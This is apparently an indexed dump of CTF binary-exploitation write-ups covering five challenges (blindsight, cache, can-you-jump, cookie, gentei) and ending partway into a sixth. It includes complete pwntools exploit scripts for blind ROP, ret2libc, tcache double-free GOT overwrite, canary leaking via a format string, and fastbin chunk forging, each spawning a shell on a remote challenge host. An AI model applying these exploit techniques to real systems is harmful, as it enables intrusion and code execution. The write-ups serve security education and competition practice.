</ol>"},{"location":"cyberedu/pwn/blindsight/description/#phase-1-stack-layout-stop-gadget","title":"Phase 1: Stack Layout &amp; Stop Gadget","text":"<p>Before we can chain gadgets, we need to know two things: where the Return Instruction Pointer (RIP) is on the stack, and where to jump to keep the program alive.</p>"},{"location":"cyberedu/pwn/blindsight/description/#1-finding-the-offset","title":"1. Finding the Offset","text":"<p>By sending cyclic patterns, we identified that the application crashes after 88 bytes.</p> <ul> <li>Offset: <code>88</code></li> </ul>"},{"location":"cyberedu/pwn/blindsight/description/#2-finding-the-stop-gadget","title":"2. Finding the \"Stop Gadget\"","text":"<p>When we fuzz return addresses blindly, most addresses will cause a crash (EOF). However, valid addresses (like the <code>main</code> function or <code>_start</code>) will restart the service or print the welcome message again. This is our \"Stop Gadget\"\u2014it acts as a safe landing pad for our ROP chains.</p> <p>Script Logic (<code>find_stop.py</code>): The script iterates through addresses starting at <code>0x400000</code> (standard non-PIE base).</p> <ul> <li>Crash: Connection closes -&gt; Wrong address.</li> <li>\"blind\" / \"No password\": Program restarted -&gt; Found Stop Gadget.</li> </ul> <p>Result: <code>0x4005c0</code> (Likely the address of <code>main</code>).</p>"},{"location":"cyberedu/pwn/blindsight/description/#phase-2-hunting-brop-gadgets","title":"Phase 2: Hunting BROP Gadgets","text":"<p>We need gadgets to pop arguments into registers (specifically <code>RDI</code> for function calls like <code>puts</code> or <code>system</code>). The best target in 64-bit binaries is <code>__libc_csu_init</code>, which contains a sequence of 6 pops: <code>pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</code></p>"},{"location":"cyberedu/pwn/blindsight/description/#scanning-logic","title":"Scanning Logic","text":"<p>We scan for this gadget using a specific stack layout:</p> <ol> <li>Probe Address: The address we are testing.</li> <li>Traps: 6 dummy values (e.g., <code>0xDEADBEEF</code>) to fill the registers if it is indeed a pop gadget.</li> <li> <p>Stop Gadget: If the pops succeed, the <code>ret</code> will jump here and restart the service.</p> </li> <li> <p>If Address is NOT a gadget: It crashes or halts.</p> </li> <li>**If Address IS <code>pop x6; ret**</code>: It pops the 6 traps and successfully jumps to the Stop Gadget.</li> </ol> <p>Script Logic (<code>find_gadgets.py</code>): We scan from <code>0x4005c0</code>.</p> <ul> <li>Found Universal Gadget at: <code>0x4007ba</code></li> <li>Derived <code>pop rdi; ret</code>: <code>0x4007ba + 9</code> = <code>0x4007c3</code></li> </ul>"},{"location":"cyberedu/pwn/blindsight/description/#phase-3-finding-putsplt","title":"Phase 3: Finding <code>puts@plt</code>","text":"<p>Now we control <code>RDI</code> (first argument), but we need a function to print data. We scan the PLT region for <code>puts</code>.</p>"},{"location":"cyberedu/pwn/blindsight/description/#the-test","title":"The Test","text":"<p>We construct a ROP chain that attempts to print the ELF header (<code>0x400000</code>) using every address in the PLT range.</p> <ul> <li>Chain: <code>pop rdi</code> -&gt; <code>0x400000</code> -&gt; <code>PROBE_ADDR</code> -&gt; <code>STOP_GADGET</code></li> <li>Success Condition: If we receive the bytes <code>\\x7fELF</code>, then <code>PROBE_ADDR</code> is <code>puts@plt</code>.</li> </ul> <p>Script Logic (<code>find_puts.py</code>): The script threads connections to scan rapidly. Result: <code>puts@plt</code> found at <code>0x400550</code>.</p>"},{"location":"cyberedu/pwn/blindsight/description/#phase-4-dumping-the-binary-optional","title":"Phase 4: Dumping the Binary (Optional)","text":"<p>With <code>puts</code> and a write primitive, we can dump the entire binary from memory to local disk to analyze it in Ghidra/IDA, though it's not strictly necessary if we just want to ROP.</p> <p>Script (<code>dump.py</code>): Reads memory page by page starting at <code>0x400000</code> and saves it to a file.</p>"},{"location":"cyberedu/pwn/blindsight/description/#phase-5-final-exploit-ret2libc","title":"Phase 5: Final Exploit (Ret2Libc)","text":"<p>We now have all the ingredients for a standard Ret2Libc attack.</p> <ol> <li>Leak GOT: Use <code>puts</code> to print the address stored in <code>puts@got</code>.</li> <li>Calculate Libc: Subtract the static offset of <code>puts</code> to find the libc base.</li> <li>Shell: Calculate the address of <code>system</code> and <code>/bin/sh</code> and execute.</li> </ol>"},{"location":"cyberedu/pwn/blindsight/description/#step-1-verification-leak","title":"Step 1: Verification &amp; Leak","text":"<p>We first verify we can leak the machine code at <code>puts@plt</code> to calculate the GOT offset.</p> <ul> <li>Leak: Machine code <code>ff 25 xx xx xx xx</code> (JMP [RIP+offset]).</li> <li>Calculation: <code>puts@got</code> = <code>RIP</code> + <code>offset</code>.</li> </ul>"},{"location":"cyberedu/pwn/blindsight/description/#step-2-the-attack-script-roppy","title":"Step 2: The Attack Script (<code>rop.py</code>)","text":"<pre><code># 1. Leak Libc Address\npayload = b\"A\" * 88\npayload += p64(pop_rdi)\npayload += p64(puts_got)        # Arg: puts@got\npayload += p64(puts_plt)        # Func: puts()\npayload += p64(stop_gadget)     # Restart for second payload\n\n# 2. Receive Leak &amp; Calculate Base\n# ... (recv and math) ...\n\n# 3. Shell Payload\npayload2 = b\"A\" * 88\npayload2 += p64(pop_rdi)\npayload2 += p64(bin_sh)         # Arg: \"/bin/sh\"\npayload2 += p64(system)         # Func: system()\n\np.sendline(payload2)\np.interactive()\n</code></pre> <p>Outcome: The script successfully leaks the libc version (likely <code>libc-2.23.so</code>), calculates the base, and pops a shell.</p>"},{"location":"cyberedu/pwn/cache/description/","title":"Description","text":""},{"location":"cyberedu/pwn/cache/description/#ctf-challenge-writeup","title":"CTF Challenge Writeup","text":""},{"location":"cyberedu/pwn/cache/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The vulnerability is a Double Free and Use-After-Free (UAF) caused by the improper handling of the <code>input_buffer</code> pointer.</p> <p>In the menu loop:</p> <ol> <li>Option 2 (<code>Make new user</code>): Allocates 16 bytes to <code>input_buffer</code>.</li> <li>Option 7 (<code>Delete user</code>): Frees <code>input_buffer</code> but does not set the pointer to NULL.</li> </ol> <pre><code>else if (menu_input == 7) {\n  free(input_buffer); // Pointer remains dangling\n}\n</code></pre> <p>Since the pointer is not cleared:</p> <ul> <li>We can free it again (Double Free).</li> <li>We can write to it using Option 4 (<code>Edit Student Name</code>) even after it is freed (UAF).</li> </ul>"},{"location":"cyberedu/pwn/cache/description/#exploit-steps","title":"Exploit Steps","text":"<p>The target environment uses <code>glibc 2.27</code>, which allows for Tcache poisoning via double frees without modern checks.</p>"},{"location":"cyberedu/pwn/cache/description/#1-tcache-poisoning-double-free","title":"1. Tcache Poisoning (Double Free)","text":"<p>We allocate a chunk and free it twice to create a recursive loop in the tcache bin.</p> <ul> <li><code>Make new user</code> (Alloc Chunk A)</li> <li><code>Delete user</code> (Free A)</li> <li><code>Delete user</code> (Free A)</li> </ul> <p>Tcache State: <code>Chunk A -&gt; Chunk A</code></p>"},{"location":"cyberedu/pwn/cache/description/#2-arbitrary-address-write-setup","title":"2. Arbitrary Address Write Setup","text":"<p>We use the UAF (Option 4) to modify the <code>fd</code> pointer of the freed Chunk A to point to the Global Offset Table (GOT) entry for <code>free</code>.</p> <ul> <li><code>Edit Student Name</code>: Overwrite content with address of <code>free@got</code>.</li> </ul> <p>Tcache State: <code>Chunk A -&gt; free@got</code></p>"},{"location":"cyberedu/pwn/cache/description/#3-pointing-to-got","title":"3. Pointing to GOT","text":"<p>We allocate two chunks. The first consumes Chunk A, and the second returns the address we injected (<code>free@got</code>).</p> <ul> <li><code>Make new user</code> (Consumes Chunk A)</li> <li><code>Make new user</code>: Consumes <code>free@got</code>. The global <code>input_buffer</code> now points directly to the <code>free</code> function pointer in the GOT.</li> <li>Note: This step forces a write. We write a single byte (<code>\\x41</code>) to minimize corruption, only changing the Least Significant Byte (LSB) of the <code>free</code> address.</li> </ul>"},{"location":"cyberedu/pwn/cache/description/#4-libc-leak-repair","title":"4. Libc Leak &amp; Repair","text":"<p>Since <code>input_buffer</code> points to <code>free@got</code>, we can read it to leak the libc address.</p> <ul> <li><code>Print Student Name</code>: Reads the address stored at <code>free@got</code>.</li> <li>Repair Logic: Because the previous step corrupted the LSB with <code>0x41</code>, we calculate the base address by masking off the LSB of the leak and restoring it using the static symbol offset from the provided libc.</li> </ul>"},{"location":"cyberedu/pwn/cache/description/#5-overwrite-win","title":"5. Overwrite &amp; Win","text":"<p>With the libc base calculated and <code>input_buffer</code> still pointing to <code>free@got</code>, we overwrite <code>free</code> with a <code>one_gadget</code>.</p> <ul> <li><code>Edit Student Name</code>: Write the address of <code>one_gadget</code>.</li> <li><code>Delete user</code>: Calls <code>free()</code>. Since the GOT is hijacked, this triggers the <code>one_gadget</code> and spawns a shell.</li> </ul>"},{"location":"cyberedu/pwn/cache/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p> <pre><code>#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./vuln_patched\")\nlibc = ELF(\"./libc.so.6\")\nld = ELF(\"./ld-2.27.so\")\n\ncontext.binary = exe\n\ndef conn():\n    if args.LOCAL:\n        r = process([exe.path])\n    else:\n        r = remote(\"34.40.105.109\", 31466)\n    return r\n\ndef main():\n    r = conn()\n\n    def send_choice(num):\n        r.sendafter(b'Choice: ', str(num).encode() + b'\\n')\n\n    def makeNewUser(name=b'pwngod\\x00', pad=True):\n        send_choice(2)\n        if pad and len(name) &lt; 16:\n            name = name.ljust(16, b'\\x00')\n        r.sendafter(b'name: ', name)\n\n    def editStudentName(payload):\n        send_choice(4)\n        if isinstance(payload, int):\n            payload = p64(payload)\n        r.sendafter(b'name: ', payload)\n\n    def printStudentName():\n        send_choice(5)\n        r.recvuntil(b\"Students name is \")\n        return r.recvline().strip()\n\n    def deleteUser():\n        send_choice(7)\n\n    log.info(\"--- STARTING EXPLOIT ---\")\n\n    makeNewUser()       \n    deleteUser()        \n    deleteUser()        \n\n    log.info(f\"Targeting free@got: {hex(exe.got['free'])}\")\n    editStudentName(exe.got['free'])\n\n    makeNewUser()       \n\n    log.info(\"Corrupting free@got LSB...\")\n    makeNewUser(b'A', pad=False)\n\n    raw_leak = printStudentName()\n\n    leak_int = u64(raw_leak.ljust(8, b'\\x00'))\n\n    log.info(f\"Raw corrupted leak: {hex(leak_int)}\")\n\n    fixed_addr = (leak_int &amp; 0xFFFFFFFFFFFFFF00) | (libc.symbols['free'] &amp; 0xFF)\n\n    log.info(f\"Repaired free address: {hex(fixed_addr)}\")\n\n    libc.address = fixed_addr - libc.symbols['free']\n    log.success(f\"Libc Base: {hex(libc.address)}\")\n\n    one_gadget = libc.address + 0x10a38c\n\n    log.info(f\"Overwriting free -&gt; One Gadget ({hex(one_gadget)})...\")\n    editStudentName(p64(one_gadget))\n\n    log.info(\"Triggering Shell (calling free)...\")\n    deleteUser()\n\n    r.interactive()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"cyberedu/pwn/can-you-jump/description/","title":"can-you-jump - CTF Writeup","text":"<p>Challenge Name: can-you-jump Description: How far can you jump?</p>"},{"location":"cyberedu/pwn/can-you-jump/description/#overview","title":"Overview","text":"<p>We are provided with 2 files: the <code>can-you-jump</code> program binary and the libc. We will have to pwn it on a remote server in order to get the flag. Given the name and the description, this will be a JOP (Jump Oriented Programming) challenge - a challenge where we need to find <code>jmp</code> gadgets in order to pwn the machine.</p>"},{"location":"cyberedu/pwn/can-you-jump/description/#initial-analysis","title":"Initial Analysis","text":"<p>Let's first run the binary and see what it does.</p> <p></p> <p>Running the binary we see that we are given the <code>printf</code> address and then we are prompted to input something. The input address is given so we can calculate the libc base in order to further calculate the <code>system</code> and <code>binsh_string</code> addresses. We have the libc so we know all the offsets. It should be easy to calculate the real addresses of libc, system and binsh_string.</p> <p>Before doing that, in order to jump through the program we need to find the buffer offset. How many bytes do we need to write in order to get to the RIP register where we can overwrite the return address of the function?</p>"},{"location":"cyberedu/pwn/can-you-jump/description/#finding-the-buffer-offset","title":"Finding the Buffer Offset","text":"<p>We will analyze the binary using radare2 and look for the buffer.</p> <p></p> <p>As we can see in the instruction at address <code>0x004006be</code>, the <code>buf</code> variable is loaded into <code>rax</code>, then into <code>rsi</code> and the <code>read</code> function is called with 256 bytes into <code>edx</code>, meaning it can read up to 256 bytes. </p> <p>Looking into the <code>buf</code> variable declaration at the top of the picture: <code>var void *buf @ rbp-0x40</code>, the buf variable is at <code>rbp-0x40</code> which means it holds up to 64 bytes. So the <code>read</code> function reads up to 256 bytes into a 64 bytes buffer, meaning we can easily overflow this and return where we want. </p> <p>We would need 64 bytes to get to <code>rbp</code> and then +8 in order to get to RIP, so 72 bytes total. What we write after 72 bytes are addresses where we want to jump to.</p>"},{"location":"cyberedu/pwn/can-you-jump/description/#exploit-development-part-1-leaking-addresses","title":"Exploit Development - Part 1: Leaking Addresses","text":"<p>We will start crafting the first part of the exploit where we will: - Get the leaked printf address - Find the offset of printf in libc - Leak the libc base (<code>printf_address - offset_address</code>) - Leak the system address in libc (<code>system_offset + libc_base</code>) - Leak the bin sh string address in libc (<code>binsh_offset + libc_base</code>) - Fill the buffer with 72 bytes</p> <p>The first part of the exploit:</p> <pre><code>from pwn import *\n\np = remote(\"34.185.160.224\", 32226)\n\n# define the buffer offset\nbuffer_fill = b\"A\" * 72\n\n# get the offsets from libc\nprintf_offset = 0x64f70\nsystem_offset = 0x4f550\nbinsh_offset = 0x1b3e1a\n\np.recvn(10)  # receive the first output\np.recvuntil(b\": \")\nprintf_addr = int(p.recvuntil(b'\\n'), 16)  # get the printf address\n\n# calculate libc base address and the real addresses of system and binsh\nlibc_base_address = printf_addr - printf_offset\nsystem_addr = libc_base_address + system_offset\nbinsh_addr = libc_base_address + binsh_offset\n</code></pre>"},{"location":"cyberedu/pwn/can-you-jump/description/#exploit-development-part-2-finding-gadgets","title":"Exploit Development - Part 2: Finding Gadgets","text":"<p>Now, what we need to do is find gadgets. The use of gadgets should ultimately let us: - Load binsh into <code>rdi</code> - Call <code>system</code></p> <p>After a careful look, we found gadgets in libc and not in the binary itself. The gadgets found are: - <code>pop rdi ; jmp rax</code> \u2192 will pop the bin sh string into rdi and jmp to rax where the system function will be already stored - <code>pop rax ; ret</code> \u2192 will pop the system function into rax and ret to <code>pop rdi ; jmp rax</code></p> <p>For these we will also need to calculate their real addresses as the libc base is dynamic: - <code>pop rdi ; jmp rax</code> address (offset + libc base) - <code>pop rax ; ret</code> address (offset + libc base)</p>"},{"location":"cyberedu/pwn/can-you-jump/description/#payload-construction","title":"Payload Construction","text":"<p>The payload will need to be: 1. Fill the buffer (send 72 bytes until RIP) 2. Return to <code>pop rax ; ret</code> gadget 3. System address (which will be popped into rax) 4. Return to <code>pop rdi ; jmp rax</code> (will pop binsh into rdi and then jump to system function which will be called) 5. Bin sh string address</p> <p>The second part of the exploit:</p> <pre><code># calculate addresses for libc gadgets\npop_rdi_jmp_rax_address = pop_rdi_jmp_rax_offset + libc_base_address\npop_rax_ret_address = pop_rax_ret_offset + libc_base_address\n\n# construct payload with gadgets from libc\npayload = buffer_fill + p64(pop_rax_ret_address) + p64(system_addr) + p64(pop_rdi_jmp_rax_address) + p64(binsh_addr)\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"cyberedu/pwn/can-you-jump/description/#success","title":"Success","text":"<p>Running this will get remote control over the machine from where we can reveal the flag.</p> <p></p>"},{"location":"cyberedu/pwn/cookie/description/","title":"Description","text":""},{"location":"cyberedu/pwn/cookie/description/#cookie-challenge-writeup","title":"Cookie Challenge Writeup","text":""},{"location":"cyberedu/pwn/cookie/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The <code>vuln()</code> function contains two critical vulnerabilities combined with a loop that iterates twice:</p> <ol> <li>Format String Vulnerability: <code>printf(local_78)</code> prints user input directly without format specifiers. This allows us to leak data from the stack.</li> <li>Buffer Overflow: The buffer <code>local_78</code> is 104 bytes, but the <code>read</code> function accepts 0x200 (512) bytes.</li> </ol> <p>These vulnerabilities are guarded by a Stack Canary. However, because the loop runs twice, we can use the first iteration to leak the canary and the second iteration to perform the buffer overflow while restoring the correct canary value.</p>"},{"location":"cyberedu/pwn/cookie/description/#exploit-steps","title":"Exploit Steps","text":""},{"location":"cyberedu/pwn/cookie/description/#1-leak-the-stack-canary","title":"1. Leak the Stack Canary","text":"<p>In the first iteration of the loop, we send a format string payload to leak the canary value from the stack.</p> <ul> <li>Payload: <code>%21$p</code></li> <li> <p>Note: Offset 21 was identified as the canary location (values ending in <code>00</code> are typical for canaries).</p> </li> <li> <p>Action: Receive the output and parse the hex string to an integer.</p> </li> </ul>"},{"location":"cyberedu/pwn/cookie/description/#2-construct-the-payload","title":"2. Construct the Payload","text":"<p>In the second iteration, we construct a buffer overflow payload. We must carefully match the stack layout to overwrite the return address without triggering the stack smashing detector.</p> <p>The layout is:</p> <ol> <li>Padding: 104 bytes (To fill <code>local_78</code>).</li> <li>Canary: 8 bytes (The leaked value from Step 1).</li> <li>Saved RBP: 8 bytes (Padding/Junk).</li> <li>RET Gadget: 8 bytes (Address of a <code>ret</code> instruction for Stack Alignment).</li> <li> <p>Why? <code>system()</code> calls in modern GLIBC require the stack to be 16-byte aligned. If the exploit crashes inside <code>do_system</code> or <code>movaps</code>, a <code>ret</code> gadget aligns the stack.</p> </li> <li> <p>Return Address: 8 bytes (Address of <code>getshell</code> function).</p> </li> </ol>"},{"location":"cyberedu/pwn/cookie/description/#3-execution","title":"3. Execution","text":"<p>Sending the payload overwrites the return address. When <code>vuln()</code> returns, execution flow jumps to <code>getshell()</code>, executing <code>system(\"/bin/bash\")</code>.</p> <pre><code>payload = flat(\n    b'A' * 104,           # Buffer padding\n    canary_leak,          # Restore Canary\n    b'B' * 8,             # Overwrite RBP\n    0x00000000004005d6,   # Ret Gadget (Align Stack)\n    elf.symbols['getshell'] # Win Function\n)\n</code></pre>"},{"location":"cyberedu/pwn/cookie/description/#exploit-script","title":"Exploit Script","text":"<p>Here is the final solution:</p> <pre><code>from pwn import *\n\nexe = './cookie'\nelf = ELF(exe)\ncontext.binary = elf\n# p = process(exe)\np = remote(\"34.40.105.109\",32470)\nlog.info(\"Phase 1: Leaking Canary with %21$p...\")\n\np.sendline(b'%21$p')\n\np.recvuntil(b\"0x\")\ncanary_leak = int(p.recvline().strip(), 16)\nlog.success(f\"Canary Leaked: {hex(canary_leak)}\")\n\nlog.info(\"Phase 2: Overwriting Stack...\")\n\npadding = b'A' * 104\n\ncanary_payload = p64(canary_leak)\nrbp_padding = b'a' * 8\nwin_address = p64(elf.symbols['getshell'])\nsimple_ret_gadget = p64(0x00000000004005d6)\n\npayload = padding + canary_payload + rbp_padding + simple_ret_gadget + win_address\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"cyberedu/pwn/gentei/description/","title":"Description","text":""},{"location":"cyberedu/pwn/gentei/description/#gentei-ctf-pwn-writeup","title":"Gentei - CTF Pwn Writeup","text":"<p>Challenge: gentei Category: Pwn / Heap Exploitation GLIBC Version: 2.25 (No Tcache) Protections: Partial RELRO, Canary, NX, No PIE</p>"},{"location":"cyberedu/pwn/gentei/description/#challenge-overview","title":"Challenge Overview","text":"<p><code>gentei</code> is a heap exploitation challenge running on glibc 2.25. The binary manages a list of \"guesses\" (heap chunks) but fails to clear pointers after freeing them, leading to a textbook Use-After-Free (UAF) vulnerability.</p> <p>Because the environment is glibc 2.25, there is no Tcache. We are forced to use Fastbins. However, glibc 2.25 introduces a strict security check for fastbins:</p> <p><code>malloc(): memory corruption (fast)</code></p> <p>This error occurs if the size field of the chunk we are trying to allocate does not match the fastbin index (in this case, <code>0x20</code>). This prevents us from simply pointing a UAF pointer to the GOT or <code>__free_hook</code> directly, as those memory regions do not have a valid <code>0x21</code> size field sitting there by coincidence.</p> <p>To bypass this, we must perform a \"BSS Crawl\" (also known as a House of Spirit chain) to forge fake chunks down the BSS section until we reach the global pointer array.</p>"},{"location":"cyberedu/pwn/gentei/description/#1-analysis-vulnerabilities","title":"1. Analysis &amp; Vulnerabilities","text":""},{"location":"cyberedu/pwn/gentei/description/#the-danglingpointer","title":"The <code>danglingPointer</code>","text":"<p>The binary stores guesses in a global array located in the <code>.bss</code> section. The array is indexed relative to a global variable called <code>danglingPointer</code> at <code>0x6020e0</code>.</p> <pre><code>// Decompiled Logic\nguess_ptr = &amp;danglingPointer + (index + 8) * 8;\n</code></pre> <ul> <li><code>danglingPointer</code>: <code>0x6020e0</code></li> <li><code>guess[0]</code>: <code>0x6020e0 + (0+8)*8 = 0x602120</code></li> </ul>"},{"location":"cyberedu/pwn/gentei/description/#the-god-byte-vulnerability","title":"The \"God Byte\" Vulnerability","text":"<p>The <code>pwn()</code> function (Option 5) allows us to write a single byte to <code>0x6020e8</code> (offset +8 from <code>danglingPointer</code>).</p> <pre><code>printf(\"Number of guesses: \");\n__isoc99_scanf(&amp;%hhu, &amp;DAT_006020e8);\n</code></pre> <p>If we write <code>33</code> (<code>0x21</code>) here, we create a valid fake chunk header at <code>0x6020e0</code>:</p> <ul> <li><code>0x6020e0</code>: <code>0x00000000</code> (prev_size)</li> <li><code>0x6020e8</code>: <code>0x00000021</code> (size + PREV_INUSE)</li> </ul> <p>This forged size field is the key to bypassing the fastbin security check.</p>"},{"location":"cyberedu/pwn/gentei/description/#2-exploitation-strategy-the-bss-crawl","title":"2. Exploitation Strategy: The BSS Crawl","text":"<p>We cannot reach the target <code>guess[0]</code> array (<code>0x602120</code>) directly from <code>0x6020e0</code> because <code>fgets</code> only allows writing 23 bytes, and the distance is 64 bytes. We must \"leapfrog\" down memory, creating new fake chunks as we go.</p>"},{"location":"cyberedu/pwn/gentei/description/#leap-1-the-bridge","title":"Leap 1: The Bridge","text":"<ol> <li>Poison: Use UAF to point the fastbin <code>fd</code> to <code>0x6020e0</code> (our Genesis Chunk).</li> <li>Alloc: <code>malloc</code> returns a pointer to <code>0x6020f0</code> (User Data).</li> <li>Forge: Write <code>p64(0) + p64(0x21)</code> to <code>0x6020f0</code>.</li> <li>This creates a valid chunk header at <code>0x6020f0</code> (size field at <code>0x6020f8</code>).</li> </ol>"},{"location":"cyberedu/pwn/gentei/description/#leap-2-the-extension","title":"Leap 2: The Extension","text":"<ol> <li>Poison: Point fastbin to <code>0x6020f0</code>.</li> <li>Alloc: <code>malloc</code> returns <code>0x602100</code>.</li> <li>Forge: Write <code>p64(0) + p64(0x21)</code> to <code>0x602100</code>.</li> <li>Crucial Detail: We must pad this write with NULL bytes (<code>\\x00</code>). If <code>fgets</code> appends a newline <code>\\n</code> (<code>0x0a</code>) here, it corrupts the fastbin <code>fd</code> pointer for the next allocation, causing a crash.</li> </ol>"},{"location":"cyberedu/pwn/gentei/description/#leap-3-the-target-index-12","title":"Leap 3: The Target (Index 12)","text":"<ol> <li>Poison: Point fastbin to <code>0x602100</code>.</li> <li>Alloc: <code>malloc</code> returns <code>0x602110</code>.</li> </ol> <p>We now control memory starting at <code>0x602110</code>. The global <code>guess[0]</code> pointer is stored at <code>0x602120</code>. The distance is exactly 16 bytes.</p> <p>By writing 16 bytes of padding + 8 bytes of an address, we overwrite the <code>guess[0]</code> pointer!</p> <pre><code>| Address  | Content                      |\n| :------- | :--------------------------- |\n| 0x602110 | [ AAAAAAAA ] (Padding)       |\n| 0x602118 | [ AAAAAAAA ] (Padding)       |\n| 0x602120 | [ TARGET   ] &lt;--- OVERWRITE! |\n</code></pre>"},{"location":"cyberedu/pwn/gentei/description/#3-the-double-hook-pivot","title":"3. The \"Double Hook\" Pivot","text":"<p>Once we control <code>guess[0]</code>, we can point it to the GOT to leak libc. After leaking libc, we target <code>__malloc_hook</code>.</p> <p>However, <code>one_gadget</code> often fails with <code>malloc</code> or <code>free</code> because the stack is misaligned or constraints aren't met. We use the <code>realloc</code> stack pivot:</p> <ol> <li>Overwrite <code>__realloc_hook</code> with <code>one_gadget</code>.</li> <li>Overwrite <code>__malloc_hook</code> with <code>realloc + 2</code>.</li> </ol> <p>Why?</p> <ul> <li><code>malloc</code> calls <code>__malloc_hook</code> -&gt; Jumps to <code>realloc + 2</code>.</li> <li><code>realloc + 2</code> skips the first <code>push</code> instruction, shifting the stack pointer (<code>RSP</code>) by 8 bytes.</li> <li><code>realloc</code> then calls <code>__realloc_hook</code> -&gt; Jumps to <code>one_gadget</code>.</li> <li>The shifted stack satisfies the <code>one_gadget</code> constraints (e.g., <code>[rsp+0x50] == NULL</code>).</li> </ul>"},{"location":"cyberedu/pwn/gentei/description/#4-final-exploit-script","title":"4. Final Exploit Script","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nelf = context.binary = ELF('./gentei_patched')\nlibc = ELF('./libc.so.6')\ncontext.log_level = 'debug'\np = elf.process()\n# p = remote(\"34.179.171.239\", 31209)\n\ndef guess(idx, data):\n    p.sendlineafter(b\"&gt; \", b\"1\")\n    p.sendlineafter(b\"Index: \", str(idx).encode())\n    p.sendafter(b\"Guess: \", data)\n\ndef delete(idx):\n    p.sendlineafter(b\"&gt; \", b\"2\")\n    p.sendlineafter(b\"Index: \", str(idx).encode())\n\ndef print_guess(idx):\n    p.sendlineafter(b\"&gt; \", b\"3\")\n    p.sendlineafter(b\"Index: \", str(idx).encode())\n    leak = p.recvuntil(b\"&gt; \")\n    p.unrecv(b\"&gt; \")\n    return leak[:-2]\n\ndef edit(idx, data):\n    p.sendlineafter(b\"&gt; \", b\"4\")\n    p.sendlineafter(b\"Index: \", str(idx).encode())\n    p.sendafter(b\"New guess: \", data)\n\ndef forge_bss_size(num):\n    p.sendlineafter(b\"&gt; \", b\"5\")\n    p.sendlineafter(b\"Number of guesses: \", str(num).encode())\n\n# we want to forge chunks in bss for having an arbitrary write in the heap\n# because tcache is disabled, we need to bypass the fastbin check\n# whenever we allocate a chunk from fastbin, it makes the following check\n# let's say we allocate at address x\n# fastbin will check if at x + 8 there is a valid size\n# for example if we want to allocate a 0x21 size chunk at address x, at x + 8, there needs to be the value 0x21 (33 decimal)\n# this is why we are first writing 33 (0x21) at the address 0x6020e8\nlog.info(\"Forging initial size field in BSS\")\nforge_bss_size(33)\n\n# now, we can allocate a chunk at 0x6020e0, because it will pass the fastbin check\nlog.info(\"Leap 1 - Forging chunk at 0x6020f0\")\nguess(4, b\"AAAA\\n\")\n\n# we put the chunk back into fastbin\n# free guess doesn't free the pointer so we have a dangling pointer\ndelete(4)\n\n# we edit the fd pointer of that to point to 0x6020e0 and the size check will pass\nedit(4, p64(0x6020e0) + b\"\\n\")\n\n# we allocate a chunk\n# now the head of the fast bin is 0x6020e0\nguess(5, b\"BBBB\\n\")\n\n# now we will allocate another chunk and it will give us the address at the head of the fastbin (0x6020e0)\n# it will check at 0x6020e0 + 8 and it will see 0x21 -&gt; valid size\n# now we will have a pointer returned at 0x6020e0 + 16 = 0x6020f0\n# at 0x6020f0 we will have : 00000000 00000021 000000..\n# meaning that we are constructing another valid chunk header\n# send 0x22 bytes. This forces 0x602100 to be completely 0x00!\nguess(6, p64(0) + p64(0x21) + b\"\\x00\"*6)\n\nlog.info(\"Leap 2 - Forging chunk at 0x602100\")\n\n# same technique : malloc -&gt; free -&gt; overwrite fd -&gt; get fd at the head of the fastbin\nguess(7, b\"CCCC\\n\")\ndelete(7)\nedit(7, p64(0x6020f0) + b\"\\n\")\nguess(8, b\"DDDD\\n\")\n\n# 0x6020f0 will check 0x6020f8 where it will find 0x21 -&gt; valid chunk size\n# it will return a pointer at 0x602100\n# at 0x602100 : 00000000 00000021 000000..\n# Send EXACTLY 22 bytes. This forces 0x602110 to be completely 0x00!\nguess(9, p64(0) + p64(0x21) + b\"\\x00\"*6)\n\nlog.info(\"Leap 3 - Overwriting guess[0] with puts@GOT\")\n# same first steps\nguess(10, b\"EEEE\\n\")\ndelete(10)\nedit(10, p64(0x602100) + b\"\\n\")\nguess(11, b\"FFFF\\n\")\n\n# will check 602108 -&gt; valid chunk size and will return a pointer at 0x602110\n# 16 bytes padding and will write the puts got address at 0x602120\n# 16 bytes pad + 6 bytes GOT = 22 bytes. Hits guess[0] perfectly at 0x602120\npayload = b\"A\" * 16 + p64(elf.got['puts'])[:6]\nguess(12, payload)\n\n# this will leak the puts got address because of how the guess memory address is calculated\n# now guess[0] points to our forged chunk\nlog.info(\"Leaking Libc Base\")\nraw_leak = print_guess(0)\n\n# calculate libc base address\nputs_leak = u64(raw_leak.ljust(8, b\"\\x00\"))\nlibc.address = puts_leak - libc.symbols['puts']\n\nlog.success(f\"Puts leaked at: {hex(puts_leak)}\")\nlog.success(f\"Libc base at: {hex(libc.address)}\")\n\n# after many tryings with free hook, malloc hook, the only one that worked seamessly was the __realloc_hook\nlog.info(\"Redirecting guess[0] to __realloc_hook\")\n# We target __realloc_hook, which is exactly 8 bytes BEFORE __malloc_hook\npayload = b\"A\" * 16 + p64(libc.symbols['__realloc_hook'])[:6]\n# put the realloc hook address at guess[0]\nedit(12, payload)\n\nlog.info(\"Writing one_gadget and realloc to fix stack alignment\")\n\none_gadget = libc.address + 0xd6fb1\n\n# we add +2 to realloc to skip the first 'push' instruction, shifting the stack for proper allignment\nrealloc_adjust = libc.symbols['realloc'] + 2\n\n# p64(one_gadget) lands exactly in __realloc_hook\n# p64(realloc_adjust) lands exactly in __malloc_hook\npayload = p64(one_gadget) + p64(realloc_adjust)\nedit(0, payload + b\"\\n\")\n\nlog.info(\"Triggering shell via malloc...\")\n# when malloc is called, it triggers the chain: malloc -&gt; realloc -&gt; __realloc_hook -&gt; one_gadget\np.sendlineafter(b\"&gt; \", b\"1\")\np.sendlineafter(b\"Index: \", b\"50\")\n\np.interactive()\n</code></pre>"},{"location":"cyberedu/pwn/honeypot/description/","title":"Description","text":""},{"location":"cyberedu/pwn/honeypot/description/#honeypot-challenge-writeup","title":"Honeypot Challenge Writeup","text":""},{"location":"cyberedu/pwn/honeypot/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>The challenge is a logic puzzle involving Random Number Generator (RNG) Prediction and 